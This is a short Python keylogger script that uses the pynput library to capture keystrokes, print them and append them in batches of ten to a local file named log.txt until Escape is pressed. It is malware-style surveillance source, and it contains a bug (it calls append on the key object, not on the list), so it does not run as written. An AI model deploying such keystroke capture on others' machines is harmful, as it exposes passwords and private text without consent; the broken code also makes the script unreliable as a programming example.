import pynput

from pynput.keyboard import Key, Listener

count = 0
Keys = []

def Press(key):
    global Keys, count
    
    key.append(key)
    count += 1
    
    print("Key Pressed: {0}".format(key))
    
    if count >= 10:
        count = 0
        write_file(Keys)
        Keys = []
    
def Release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))


with Listener( on_press=Press ,on_release=Release)  as listener:
    listener.join()
    
    
